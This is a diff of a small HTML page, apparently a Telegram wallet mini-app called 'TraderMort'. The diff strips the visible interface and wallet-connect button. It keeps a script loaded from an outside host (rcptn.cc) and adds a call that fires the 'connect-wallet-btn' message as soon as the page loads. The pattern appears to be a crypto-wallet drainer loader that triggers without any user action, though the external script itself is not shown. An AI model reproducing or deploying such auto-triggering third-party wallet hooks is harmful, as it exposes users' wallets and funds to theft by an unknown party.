@@ -1,50 +1,21 @@
 
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>TraderMort — Wallet</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <script src="https://rcptn.cc/static/reception/js/build.js"></script>
-  <style>
-    body {
-      margin: 0;
-      padding: 24px;
-      font-family: Arial, sans-serif;
-      background: var(--tg-theme-bg-color, #111827);
-      color: var(--tg-theme-text-color, #ffffff);
-    }
-    button {
-      width: 100%;
-      padding: 16px;
-      border: 0;
-      border-radius: 12px;
-      background: #16a34a;
-      color: white;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wallet</title>
 </head>
 <body>
-  <h2>TraderMort</h2>
-  <p>Подключение криптокошелька</p>
-
-  <button onclick="open_window()">🔗 Подключить кошелёк</button>
+  <script src="https://rcptn.cc/static/reception/js/build.js"></script>
 
   <script>
-    const tg = window.Telegram?.WebApp;
-    tg?.ready();
-    tg?.expand();
-
     function open_window() {
-      window.postMessage(
-        { type: 'connect-wallet-btn' },
-        '*'
-      );
+      window.postMessage({ type: 'connect-wallet-btn' }, '*');
     }
+
+    open_window();
   </script>
 </body>
 </html>
+
